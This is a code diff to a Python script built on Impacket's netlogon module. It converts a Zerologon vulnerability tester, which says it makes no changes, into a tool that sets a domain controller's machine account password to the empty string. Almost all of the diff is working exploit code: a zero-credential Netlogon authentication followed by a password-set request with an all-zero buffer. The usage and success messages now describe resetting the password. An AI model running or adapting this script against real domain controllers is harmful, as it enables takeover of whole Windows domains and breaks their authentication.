@@ -52,7 +52,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
     print()
     server_auth.dump()
     print("server challenge", serverChallenge)
-    #sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("c9a22836bc33154d0821568c3e18e7ff"))
+    #sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("c9a22836bc33154d0821568c3e18e7ff")) # that ntlm is just a randomly generated machine hash from a lab VM, it's not sensitive
     #print("session key", sessionKey)
 
     try:
@@ -72,13 +72,13 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       #print("authenticator cred", authenticatorCred)
       authenticator['Credential'] = ciphertext #authenticatorCred
       authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var
-      request = nrpc.NetrLogonGetCapabilities()
-      request['ServerName'] = '\x00'*20
-      request['ComputerName'] = target_computer + '\x00'
-      request['Authenticator'] = authenticator
-      request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
-      request['ReturnAuthenticator']['Timestamp'] = 0 
-      request['QueryLevel'] = 1
+      #request = nrpc.NetrLogonGetCapabilities()
+      #request['ServerName'] = '\x00'*20
+      #request['ComputerName'] = target_computer + '\x00'
+      #request['Authenticator'] = authenticator
+      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
+      #request['ReturnAuthenticator']['Timestamp'] = 0 
+      #request['QueryLevel'] = 1
       #resp = rpc_con.request(request)
       #resp.dump()
       
@@ -92,7 +92,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       #request['ReturnAuthenticator']['Timestamp'] = 0
       request["ClearNewPassword"] = nrpc.NL_TRUST_PASSWORD()
       request["ClearNewPassword"]["Buffer"] = b'\x00'*512
-      request["ClearNewPassword"]["Length"] = 0
+      request["ClearNewPassword"]["Length"] = 0 # It winds up being 516 bytes mentioned in the Secur whitepaper because this is 4 bytes
       resp = rpc_con.request(request)
       resp.dump()
 
@@ -130,7 +130,7 @@ def perform_attack(dc_handle, dc_ip, target_computer):
       break
 
   if rpc_con:
-    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
+    print('\nSuccess! DC should now have the empty string as its machine password.')
   else:
     print('\nAttack failed. Target is probably patched.')
     sys.exit(1)
@@ -138,8 +138,8 @@ def perform_attack(dc_handle, dc_ip, target_computer):
 
 if __name__ == '__main__':
   if not (3 <= len(sys.argv) <= 4):
-    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
-    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
+    print('Usage: set_empty_pw.py <dc-name> <dc-ip>\n')
+    print('Sets a machine account password to the empty string.')
     print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
     sys.exit(1)
   else:
